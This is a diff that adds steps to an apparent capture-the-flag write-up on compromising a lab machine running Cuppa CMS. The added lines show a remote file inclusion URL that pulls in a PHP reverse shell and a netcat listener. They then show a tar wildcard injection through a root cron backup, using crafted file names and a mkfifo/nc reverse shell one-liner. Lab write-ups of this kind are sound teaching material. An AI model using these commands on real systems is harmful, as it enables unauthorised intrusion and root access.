@@ -56,4 +56,20 @@ We find an `administrator/` page and discover a Cuppa CMS is running.
 
 There's only 1 exploit available for this CMS in exploitdb.
 
+For the reverse shell, set the IP to tun0 and the port to whichever port netcat listens on. Start a python server `python3 -m http.server` and nc listener `nc -lnvp 80`. Then, navigate to: `ip/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.4.248:8080/php-reverse-shell.php` to spawn the shell.
+
+We are running as the user www-data. The user flag is in `/home/milesdyson`. 
+
 **4. What is the root flag?**
+
+`cat /etc/crontab` shows there is a `backup.sh` script running every 1 minute. This goes to the `/var/www/html` directory and makes a backup of everything in there and saves it in `/home/milesdyson/backup`.
+
+![](cronjob.png)
+
+```
+touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+touch "/var/www/html/--checkpoint=1"
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.4.248 1234 > /tmp/f" > shell.sh
+```
+
+Open a nc listener and we have a root shell.
